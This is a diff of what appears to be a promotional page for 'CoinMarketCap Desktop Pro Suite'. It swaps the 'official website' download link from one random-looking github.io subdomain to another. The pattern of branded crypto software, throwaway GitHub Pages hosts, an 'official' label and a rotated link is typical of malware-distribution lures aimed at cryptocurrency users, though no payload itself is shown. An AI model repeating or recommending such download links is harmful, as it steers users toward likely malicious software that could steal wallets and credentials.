@@ -43,6 +43,6 @@ Here are answers to frequently asked questions to help you troubleshoot and unde
 
 Ready to enhance your crypto tracking? Download CoinMarketCap Desktop Pro Suite now from the official source:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides the latest version with all pro features included. If you encounter any issues during download or installation, refer to the FAQ section or contact our support team for assistance.
